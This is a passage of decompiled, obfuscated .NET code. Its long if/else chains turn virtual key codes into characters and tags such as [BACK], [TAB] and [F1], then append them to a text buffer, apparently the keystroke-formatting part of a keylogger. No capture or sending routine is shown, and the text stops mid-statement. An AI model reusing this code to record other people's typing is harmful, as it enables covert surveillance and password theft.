		//IL_2e97: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e9a: Invalid comparison between Unknown and I4
		//IL_2ec1: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ec4: Invalid comparison between Unknown and I4
		//IL_2eeb: Unknown result type (might be due to invalid IL or missing references)
		//IL_2eee: Invalid comparison between Unknown and I4
		//IL_2f15: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f1b: Invalid comparison between Unknown and I4
		//IL_2f42: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f48: Invalid comparison between Unknown and I4
		//IL_2f6f: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f75: Invalid comparison between Unknown and I4
		//IL_2f9c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2fa2: Invalid comparison between Unknown and I4
		//IL_2fc9: Unknown result type (might be due to invalid IL or missing references)
		//IL_2fcf: Invalid comparison between Unknown and I4
		//IL_2ff6: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ffc: Invalid comparison between Unknown and I4
		//IL_3023: Unknown result type (might be due to invalid IL or missing references)
		//IL_3029: Invalid comparison between Unknown and I4
		//IL_3050: Unknown result type (might be due to invalid IL or missing references)
		//IL_3056: Invalid comparison between Unknown and I4
		//IL_307d: Unknown result type (might be due to invalid IL or missing references)
		//IL_3083: Invalid comparison between Unknown and I4
		//IL_30aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_30b0: Invalid comparison between Unknown and I4
		//IL_30d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_30da: Invalid comparison between Unknown and I4
		//IL_3101: Unknown result type (might be due to invalid IL or missing references)
		//IL_3104: Invalid comparison between Unknown and I4
		//IL_312b: Unknown result type (might be due to invalid IL or missing references)
		//IL_312e: Invalid comparison between Unknown and I4
		//IL_3155: Unknown result type (might be due to invalid IL or missing references)
		//IL_3158: Invalid comparison between Unknown and I4
		//IL_317f: Unknown result type (might be due to invalid IL or missing references)
		//IL_3182: Invalid comparison between Unknown and I4
		//IL_31a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_31ac: Invalid comparison between Unknown and I4
		//IL_31d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_31d6: Invalid comparison between Unknown and I4
		//IL_31fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_3200: Invalid comparison between Unknown and I4
		//IL_3227: Unknown result type (might be due to invalid IL or missing references)
		//IL_322a: Invalid comparison between Unknown and I4
		//IL_3251: Unknown result type (might be due to invalid IL or missing references)
		//IL_3254: Invalid comparison between Unknown and I4
		//IL_327b: Unknown result type (might be due to invalid IL or missing references)
		//IL_327e: Invalid comparison between Unknown and I4
		//IL_32a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_32a8: Invalid comparison between Unknown and I4
		//IL_32cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_32d2: Invalid comparison between Unknown and I4
		//IL_32f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_32fc: Invalid comparison between Unknown and I4
		//IL_3323: Unknown result type (might be due to invalid IL or missing references)
		//IL_3326: Invalid comparison between Unknown and I4
		//IL_335b: Unknown result type (might be due to invalid IL or missing references)
		//IL_335d: Invalid comparison between Unknown and I4
		//IL_3392: Unknown result type (might be due to invalid IL or missing references)
		//IL_3395: Invalid comparison between Unknown and I4
		//IL_33bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_33bf: Invalid comparison between Unknown and I4
		//IL_33e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_33e9: Invalid comparison between Unknown and I4
		//IL_3410: Unknown result type (might be due to invalid IL or missing references)
		//IL_3413: Invalid comparison between Unknown and I4
		//IL_343a: Unknown result type (might be due to invalid IL or missing references)
		//IL_343d: Invalid comparison between Unknown and I4
		//IL_3464: Unknown result type (might be due to invalid IL or missing references)
		//IL_3467: Invalid comparison between Unknown and I4
		//IL_348e: Unknown result type (might be due to invalid IL or missing references)
		//IL_3491: Invalid comparison between Unknown and I4
		//IL_34b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_34bb: Invalid comparison between Unknown and I4
		//IL_34e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_34e5: Invalid comparison between Unknown and I4
		//IL_350c: Unknown result type (might be due to invalid IL or missing references)
		//IL_350f: Invalid comparison between Unknown and I4
		//IL_3536: Unknown result type (might be due to invalid IL or missing references)
		//IL_3539: Invalid comparison between Unknown and I4
		//IL_3560: Unknown result type (might be due to invalid IL or missing references)
		//IL_3563: Invalid comparison between Unknown and I4
		//IL_35b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_35b7: Invalid comparison between Unknown and I4
		//IL_35de: Unknown result type (might be due to invalid IL or missing references)
		//IL_35e1: Invalid comparison between Unknown and I4
		//IL_3608: Unknown result type (might be due to invalid IL or missing references)
		//IL_360b: Invalid comparison between Unknown and I4
		//IL_3632: Unknown result type (might be due to invalid IL or missing references)
		//IL_3635: Invalid comparison between Unknown and I4
		//IL_365c: Unknown result type (might be due to invalid IL or missing references)
		//IL_365f: Invalid comparison between Unknown and I4
		//IL_3686: Unknown result type (might be due to invalid IL or missing references)
		//IL_3689: Invalid comparison between Unknown and I4
		//IL_36b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_36b3: Invalid comparison between Unknown and I4
		//IL_36da: Unknown result type (might be due to invalid IL or missing references)
		//IL_36dd: Invalid comparison between Unknown and I4
		//IL_3704: Unknown result type (might be due to invalid IL or missing references)
		//IL_3707: Invalid comparison between Unknown and I4
		//IL_372e: Unknown result type (might be due to invalid IL or missing references)
		//IL_3731: Invalid comparison between Unknown and I4
		//IL_3758: Unknown result type (might be due to invalid IL or missing references)
		//IL_375b: Invalid comparison between Unknown and I4
		//IL_3782: Unknown result type (might be due to invalid IL or missing references)
		//IL_3785: Invalid comparison between Unknown and I4
		//IL_37ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_37af: Invalid comparison between Unknown and I4
		//IL_37d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_37d9: Invalid comparison between Unknown and I4
		//IL_3800: Unknown result type (might be due to invalid IL or missing references)
		//IL_3803: Invalid comparison between Unknown and I4
		//IL_382a: Unknown result type (might be due to invalid IL or missing references)
		//IL_382d: Invalid comparison between Unknown and I4
		//IL_3854: Unknown result type (might be due to invalid IL or missing references)
		//IL_3857: Invalid comparison between Unknown and I4
		//IL_387e: Unknown result type (might be due to invalid IL or missing references)
		//IL_3881: Invalid comparison between Unknown and I4
		//IL_38a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_38ab: Invalid comparison between Unknown and I4
		//IL_38d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_38d5: Invalid comparison between Unknown and I4
		//IL_38fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_38ff: Invalid comparison between Unknown and I4
		//IL_3926: Unknown result type (might be due to invalid IL or missing references)
		//IL_3929: Invalid comparison between Unknown and I4
		//IL_3950: Unknown result type (might be due to invalid IL or missing references)
		//IL_3953: Invalid comparison between Unknown and I4
		//IL_397a: Unknown result type (might be due to invalid IL or missing references)
		//IL_397d: Invalid comparison between Unknown and I4
		//IL_39a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_39a7: Invalid comparison between Unknown and I4
		//IL_39ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_39d1: Invalid comparison between Unknown and I4
		//IL_39f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_39fb: Invalid comparison between Unknown and I4
		//IL_3a22: Unknown result type (might be due to invalid IL or missing references)
		//IL_3a25: Invalid comparison between Unknown and I4
		//IL_3a4c: Unknown result type (might be due to invalid IL or missing references)
		//IL_3a4f: Invalid comparison between Unknown and I4
		//IL_3a76: Unknown result type (might be due to invalid IL or missing references)
		//IL_3a79: Invalid comparison between Unknown and I4
		//IL_3aa0: Unknown result type (might be due to invalid IL or missing references)
		//IL_3aa3: Invalid comparison between Unknown and I4
		//IL_3aca: Unknown result type (might be due to invalid IL or missing references)
		//IL_3acd: Invalid comparison between Unknown and I4
		//IL_3af4: Unknown result type (might be due to invalid IL or missing references)
		//IL_3af7: Invalid comparison between Unknown and I4
		//IL_3b1e: Unknown result type (might be due to invalid IL or missing references)
		//IL_3b21: Invalid comparison between Unknown and I4
		//IL_3b48: Unknown result type (might be due to invalid IL or missing references)
		//IL_3b4b: Invalid comparison between Unknown and I4
		//IL_3b72: Unknown result type (might be due to invalid IL or missing references)
		//IL_3b75: Invalid comparison between Unknown and I4
		//IL_3b9c: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ba2: Invalid comparison between Unknown and I4
		//IL_3bc9: Unknown result type (might be due to invalid IL or missing references)
		//IL_3bcf: Invalid comparison between Unknown and I4
		//IL_3bf6: Unknown result type (might be due to invalid IL or missing references)
		//IL_3bfc: Invalid comparison between Unknown and I4
		//IL_3c23: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c29: Invalid comparison between Unknown and I4
		//IL_3c50: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c56: Invalid comparison between Unknown and I4
		//IL_3c7d: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c83: Invalid comparison between Unknown and I4
		//IL_3caa: Unknown result type (might be due to invalid IL or missing references)
		//IL_3cb0: Invalid comparison between Unknown and I4
		//IL_3cd7: Unknown result type (might be due to invalid IL or missing references)
		//IL_3cdd: Invalid comparison between Unknown and I4
		//IL_3d04: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d0a: Invalid comparison between Unknown and I4
		//IL_3d31: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d34: Invalid comparison between Unknown and I4
		//IL_3d5b: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d5e: Invalid comparison between Unknown and I4
		//IL_3d85: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d88: Invalid comparison between Unknown and I4
		//IL_3daf: Unknown result type (might be due to invalid IL or missing references)
		//IL_3db2: Invalid comparison between Unknown and I4
		//IL_3dd9: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ddc: Invalid comparison between Unknown and I4
		//IL_3e03: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e06: Invalid comparison between Unknown and I4
		//IL_3e2d: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e30: Invalid comparison between Unknown and I4
		//IL_3e57: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e5a: Invalid comparison between Unknown and I4
		//IL_3e81: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e84: Invalid comparison between Unknown and I4
		//IL_3eab: Unknown result type (might be due to invalid IL or missing references)
		//IL_3eae: Invalid comparison between Unknown and I4
		//IL_3ed5: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ed8: Invalid comparison between Unknown and I4
		//IL_3eff: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f02: Invalid comparison between Unknown and I4
		//IL_3f29: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f2c: Invalid comparison between Unknown and I4
		//IL_3f53: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f56: Invalid comparison between Unknown and I4
		//IL_3f7d: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f80: Invalid comparison between Unknown and I4
		//IL_3fb5: Unknown result type (might be due to invalid IL or missing references)
		//IL_3fb7: Invalid comparison between Unknown and I4
		//IL_3fec: Unknown result type (might be due to invalid IL or missing references)
		//IL_3fef: Invalid comparison between Unknown and I4
		//IL_4016: Unknown result type (might be due to invalid IL or missing references)
		//IL_4019: Invalid comparison between Unknown and I4
		//IL_4040: Unknown result type (might be due to invalid IL or missing references)
		//IL_4043: Invalid comparison between Unknown and I4
		//IL_406a: Unknown result type (might be due to invalid IL or missing references)
		//IL_406d: Invalid comparison between Unknown and I4
		//IL_4094: Unknown result type (might be due to invalid IL or missing references)
		//IL_4097: Invalid comparison between Unknown and I4
		//IL_40be: Unknown result type (might be due to invalid IL or missing references)
		//IL_40c1: Invalid comparison between Unknown and I4
		//IL_40e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_40eb: Invalid comparison between Unknown and I4
		//IL_4112: Unknown result type (might be due to invalid IL or missing references)
		//IL_4115: Invalid comparison between Unknown and I4
		//IL_413c: Unknown result type (might be due to invalid IL or missing references)
		//IL_413f: Invalid comparison between Unknown and I4
		//IL_4166: Unknown result type (might be due to invalid IL or missing references)
		//IL_4169: Invalid comparison between Unknown and I4
		//IL_418d: Unknown result type (might be due to invalid IL or missing references)
		//IL_4190: Invalid comparison between Unknown and I4
		//IL_41b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_41b7: Invalid comparison between Unknown and I4
		//IL_41db: Unknown result type (might be due to invalid IL or missing references)
		//IL_41e1: Invalid comparison between Unknown and I4
		if (!((Computer)Class1.smethod_0()).get_Keyboard().get_ShiftKeyDown() & !((Computer)Class1.smethod_0()).get_Keyboard().get_CapsLock())
		{
			if ((int)keys_0 == 65)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "a");
			}
			else if ((int)keys_0 == 66)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "b");
			}
			else if ((int)keys_0 == 67)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "c");
			}
			else if ((int)keys_0 == 68)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "d");
			}
			else if ((int)keys_0 == 69)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "e");
			}
			else if ((int)keys_0 == 70)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "f");
			}
			else if ((int)keys_0 == 71)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "g");
			}
			else if ((int)keys_0 == 72)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "h");
			}
			else if ((int)keys_0 == 73)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "i");
			}
			else if ((int)keys_0 == 74)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "j");
			}
			else if ((int)keys_0 == 75)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "k");
			}
			else if ((int)keys_0 == 76)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "l");
			}
			else if ((int)keys_0 == 77)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "m");
			}
			else if ((int)keys_0 == 78)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "n");
			}
			else if ((int)keys_0 == 79)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "o");
			}
			else if ((int)keys_0 == 80)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "p");
			}
			else if ((int)keys_0 == 81)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "q");
			}
			else if ((int)keys_0 == 82)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "r");
			}
			else if ((int)keys_0 == 83)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "s");
			}
			else if ((int)keys_0 == 84)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "t");
			}
			else if ((int)keys_0 == 85)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "u");
			}
			else if ((int)keys_0 == 86)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "v");
			}
			else if ((int)keys_0 == 87)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "w");
			}
			else if ((int)keys_0 == 88)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "x");
			}
			else if ((int)keys_0 == 89)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "y");
			}
			else if ((int)keys_0 == 90)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "z");
			}
			else if ((int)keys_0 == 48)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "0");
			}
			else if ((int)keys_0 == 49)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "1");
			}
			else if ((int)keys_0 == 50)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "2");
			}
			else if ((int)keys_0 == 51)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "3");
			}
			else if ((int)keys_0 == 52)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "4");
			}
			else if ((int)keys_0 == 53)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "5");
			}
			else if ((int)keys_0 == 54)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "6");
			}
			else if ((int)keys_0 == 55)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "7");
			}
			else if ((int)keys_0 == 56)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "8");
			}
			else if ((int)keys_0 == 57)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "9");
			}
			else if ((int)keys_0 == 96)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "0");
			}
			else if ((int)keys_0 == 97)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "1");
			}
			else if ((int)keys_0 == 98)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "2");
			}
			else if ((int)keys_0 == 99)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "3");
			}
			else if ((int)keys_0 == 100)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "4");
			}
			else if ((int)keys_0 == 101)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "5");
			}
			else if ((int)keys_0 == 102)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "6");
			}
			else if ((int)keys_0 == 103)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "7");
			}
			else if ((int)keys_0 == 104)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "8");
			}
			else if ((int)keys_0 == 105)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "9");
			}
			else if ((int)keys_0 == 188)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + ",");
			}
			else if ((int)keys_0 == 189)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "-");
			}
			else if ((int)keys_0 == 222)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "'");
			}
			else if ((int)keys_0 == 219)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[");
			}
			else if ((int)keys_0 == 8)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[BACK]");
			}
			else if ((int)keys_0 == 221)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "]");
			}
			else if ((int)keys_0 == 191)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "/");
			}
			else if ((int)keys_0 == 220)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "\\");
			}
			else if ((int)keys_0 == 186)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + ";");
			}
			else if ((int)keys_0 == 190)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + ".");
			}
			else if ((int)keys_0 == 192)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "`");
			}
			else if ((int)keys_0 == 32)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + " ");
			}
			else if ((int)keys_0 == 13)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "\r\n");
			}
			else if ((int)keys_0 == 112)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F1]");
			}
			else if ((int)keys_0 == 113)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F2]");
			}
			else if ((int)keys_0 == 114)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F3]");
			}
			else if ((int)keys_0 == 115)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F4]");
			}
			else if ((int)keys_0 == 116)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F5]");
			}
			else if ((int)keys_0 == 117)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F6]");
			}
			else if ((int)keys_0 == 118)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F7]");
			}
			else if ((int)keys_0 == 119)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F8]");
			}
			else if ((int)keys_0 == 120)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F9]");
			}
			else if ((int)keys_0 == 121)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F10]");
			}
			else if ((int)keys_0 == 122)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F11]");
			}
			else if ((int)keys_0 == 123)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F12]");
			}
			else if ((int)keys_0 == 46)
			{
				vmethod_0().set_Text(vmethod_0().get_Text().Remove(checked(vmethod_0().get_Text().Length - 1), 1));
			}
			else if ((int)keys_0 == 8)
			{
				vmethod_0().set_Text(vmethod_0().get_Text().Remove(checked(vmethod_0().get_Text().Length - 1), 1));
			}
			else if ((int)keys_0 == 40)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "?");
			}
			else if ((int)keys_0 == 38)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "?");
			}
			else if ((int)keys_0 == 37)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "?");
			}
			else if ((int)keys_0 == 39)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "?");
			}
			else if ((int)keys_0 == 9)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[TAB]");
			}
			else if ((int)keys_0 == 35)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[END]");
			}
			else if ((int)keys_0 == 27)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[ESC]");
			}
			else if ((int)keys_0 == 111)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "/");
			}
			else if ((int)keys_0 == 110)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + ".");
			}
			else if ((int)keys_0 == 109)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "-");
			}
			else if ((int)keys_0 == 107)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "+");
			}
			else if ((int)keys_0 == 106)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "*");
			}
		}
		else if (!((Computer)Class1.smethod_0()).get_Keyboard().get_ShiftKeyDown() & ((Computer)Class1.smethod_0()).get_Keyboard().get_CapsLock())
		{
			if ((int)keys_0 == 65)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "A");
			}
			else if ((int)keys_0 == 66)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "B");
			}
			else if ((int)keys_0 == 67)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "C");
			}
			else if ((int)keys_0 == 68)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "D");
			}
			else if ((int)keys_0 == 69)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "E");
			}
			else if ((int)keys_0 == 70)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "F");
			}
			else if ((int)keys_0 == 71)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "G");
			}
			else if ((int)keys_0 == 72)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "H");
			}
			else if ((int)keys_0 == 73)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "I");
			}
			else if ((int)keys_0 == 74)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "J");
			}
			else if ((int)keys_0 == 75)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "K");
			}
			else if ((int)keys_0 == 76)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "L");
			}
			else if ((int)keys_0 == 77)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "M");
			}
			else if ((int)keys_0 == 78)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "N");
			}
			else if ((int)keys_0 == 79)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "O");
			}
			else if ((int)keys_0 == 80)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "P");
			}
			else if ((int)keys_0 == 81)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "Q");
			}
			else if ((int)keys_0 == 82)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "R");
			}
			else if ((int)keys_0 == 83)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "S");
			}
			else if ((int)keys_0 == 84)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "T");
			}
			else if ((int)keys_0 == 85)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "U");
			}
			else if ((int)keys_0 == 86)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "V");
			}
			else if ((int)keys_0 == 87)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "W");
			}
			else if ((int)keys_0 == 88)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "X");
			}
			else if ((int)keys_0 == 89)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "Y");
			}
			else if ((int)keys_0 == 90)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "Z");
			}
			else if ((int)keys_0 == 48)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "0");
			}
			else if ((int)keys_0 == 49)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "1");
			}
			else if ((int)keys_0 == 50)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "2");
			}
			else if ((int)keys_0 == 51)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "3");
			}
			else if ((int)keys_0 == 52)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "4");
			}
			else if ((int)keys_0 == 53)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "5");
			}
			else if ((int)keys_0 == 54)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "6");
			}
			else if ((int)keys_0 == 55)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "7");
			}
			else if ((int)keys_0 == 56)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "8");
			}
			else if ((int)keys_0 == 57)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "9");
			}
			else if ((int)keys_0 == 96)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "0");
			}
			else if ((int)keys_0 == 97)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "1");
			}
			else if ((int)keys_0 == 98)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "2");
			}
			else if ((int)keys_0 == 99)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "3");
			}
			else if ((int)keys_0 == 100)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "4");
			}
			else if ((int)keys_0 == 101)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "5");
			}
			else if ((int)keys_0 == 102)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "6");
			}
			else if ((int)keys_0 == 103)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "7");
			}
			else if ((int)keys_0 == 104)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "8");
			}
			else if ((int)keys_0 == 105)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "9");
			}
			else if ((int)keys_0 == 188)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + ",");
			}
			else if ((int)keys_0 == 189)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "-");
			}
			else if ((int)keys_0 == 222)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "'");
			}
			else if ((int)keys_0 == 219)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[");
			}
			else if ((int)keys_0 == 221)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "]");
			}
			else if ((int)keys_0 == 191)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "/");
			}
			else if ((int)keys_0 == 220)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "\\");
			}
			else if ((int)keys_0 == 186)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + ";");
			}
			else if ((int)keys_0 == 190)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + ".");
			}
			else if ((int)keys_0 == 192)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "`");
			}
			else if ((int)keys_0 == 32)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + " ");
			}
			else if ((int)keys_0 == 13)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "\r\n");
			}
			else if ((int)keys_0 == 112)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F1]");
			}
			else if ((int)keys_0 == 113)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F2]");
			}
			else if ((int)keys_0 == 114)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F3]");
			}
			else if ((int)keys_0 == 115)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F4]");
			}
			else if ((int)keys_0 == 116)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F5]");
			}
			else if ((int)keys_0 == 117)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F6]");
			}
			else if ((int)keys_0 == 118)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F7]");
			}
			else if ((int)keys_0 == 119)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F8]");
			}
			else if ((int)keys_0 == 120)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F9]");
			}
			else if ((int)keys_0 == 121)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F10]");
			}
			else if ((int)keys_0 == 122)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F11]");
			}
			else if ((int)keys_0 == 123)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F12]");
			}
			else if ((int)keys_0 == 46)
			{
				vmethod_0().set_Text(vmethod_0().get_Text().Remove(checked(vmethod_0().get_Text().Length - 1), 1));
			}
			else if ((int)keys_0 == 8)
